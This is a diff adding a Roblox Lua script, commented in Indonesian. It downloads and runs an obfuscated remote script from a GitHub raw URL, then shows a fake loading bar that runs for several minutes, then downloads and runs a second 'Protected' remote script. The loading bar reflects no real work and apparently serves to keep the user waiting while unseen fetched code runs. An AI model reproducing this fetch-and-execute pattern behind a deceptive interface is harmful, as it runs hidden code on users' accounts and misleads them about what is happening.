@@ -1,0 +1,110 @@
+--// Step 1: Jalankan script awal (diperbarui)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/collectorhenfi-wq/Hendarscripthehe/refs/heads/main/script.obfuscated.lua%20(1).txt"))()
+
+--// Step 2: Tunggu 15 detik sebelum muncul GUI
+task.wait(15)
+
+--// Buat GUI
+local player = game.Players.LocalPlayer
+local PlayerGui = player:WaitForChild("PlayerGui")
+
+if PlayerGui:FindFirstChild("Loading_GUI") then
+	PlayerGui.Loading_GUI:Destroy()
+end
+
+local ScreenGui = Instance.new("ScreenGui")
+ScreenGui.Name = "Loading_GUI"
+ScreenGui.ResetOnSpawn = false
+ScreenGui.Parent = PlayerGui
+
+local Frame = Instance.new("Frame")
+Frame.Size = UDim2.new(0, 400, 0, 150)
+Frame.Position = UDim2.new(0.5, -200, 0.5, -75)
+Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+Frame.BorderSizePixel = 0
+Frame.Active = true
+Frame.Draggable = true
+Frame.Parent = ScreenGui
+
+local UICorner = Instance.new("UICorner", Frame)
+UICorner.CornerRadius = UDim.new(0, 12)
+
+local BarBack = Instance.new("Frame")
+BarBack.Size = UDim2.new(0.9, 0, 0, 20)
+BarBack.Position = UDim2.new(0.05, 0, 0.6, 0)
+BarBack.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
+BarBack.BorderSizePixel = 0
+BarBack.Parent = Frame
+
+local BarCorner = Instance.new("UICorner", BarBack)
+BarCorner.CornerRadius = UDim.new(0, 8)
+
+local Bar = Instance.new("Frame")
+Bar.Size = UDim2.new(0, 0, 1, 0)
+Bar.BackgroundColor3 = Color3.fromRGB(0, 170, 255)
+Bar.BorderSizePixel = 0
+Bar.Parent = BarBack
+
+local BarCorner2 = Instance.new("UICorner", Bar)
+BarCorner2.CornerRadius = UDim.new(0, 8)
+
+local PercentText = Instance.new("TextLabel")
+PercentText.Size = UDim2.new(1, 0, 0.3, 0)
+PercentText.Position = UDim2.new(0, 0, 0.2, 0)
+PercentText.BackgroundTransparency = 1
+PercentText.Text = "Loading... 0%"
+PercentText.Font = Enum.Font.SourceSansBold
+PercentText.TextColor3 = Color3.fromRGB(255, 255, 255)
+PercentText.TextScaled = true
+PercentText.Parent = Frame
+
+local Notif = Instance.new("TextLabel")
+Notif.Size = UDim2.new(1, 0, 0.3, 0)
+Notif.Position = UDim2.new(0, 0, 0.8, 0)
+Notif.BackgroundTransparency = 1
+Notif.Text = ""
+Notif.Font = Enum.Font.SourceSansBold
+Notif.TextColor3 = Color3.fromRGB(255, 255, 0)
+Notif.TextScaled = true
+Notif.Parent = Frame
+
+--// Step 3: Loading bar logic
+local percent = 0
+while percent < 100 do
+	percent += 1
+	PercentText.Text = "Loading... " .. percent .. "%"
+	Bar.Size = UDim2.new(percent / 100, 0, 1, 0)
+
+	-- Atur kecepatan per persen (waktu tunggu antara kenaikan 1%)
+	local delayTime = 3 -- default 3 detik
+	if percent == 29 then
+		delayTime = 2
+	elseif percent == 40 then
+		delayTime = 5
+	elseif percent == 45 then
+		delayTime = 1
+	elseif percent == 90 then
+		delayTime = 3
+	elseif percent == 99 then
+		delayTime = 3
+		Notif.Text = "Tunggu 30 detik..."
+		task.wait(30)
+		Notif.Text = ""
+	end
+
+	task.wait(delayTime)
+end
+
+--// Step 4: Countdown setelah 100%
+Notif.Text = "Selesai! Menjalankan dalam 15 detik..."
+for i = 15, 0, -1 do
+	Notif.Text = "Menjalankan dalam " .. i .. " detik..."
+	task.wait(1)
+end
+
+--// Step 5: Jalankan script terakhir
+Notif.Text = "Complete!"
+task.wait(1)
+ScreenGui:Destroy()
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/collectorhenfi-wq/Hendarr/refs/heads/main/Protected_1203131870047322.lua%20(2).txt"))()
